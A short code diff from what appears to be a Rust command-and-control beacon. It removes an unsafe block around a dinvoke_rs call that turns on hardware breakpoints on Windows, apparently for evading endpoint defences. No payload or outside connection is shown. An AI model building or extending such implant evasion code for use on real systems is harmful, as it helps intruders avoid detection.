@@ -92,7 +92,7 @@ pub fn real_main() -> Result<(), Box<dyn Error>> {
 fn run_beacon() -> Result<(), Box<dyn Error>> {
     #[cfg(target_os = "windows")]
     {
-        unsafe { dinvoke_rs::dinvoke::use_hardware_breakpoints(true); }
+        dinvoke_rs::dinvoke::use_hardware_breakpoints(true);
     }
 
     let mut agent = crate::Agent::new();
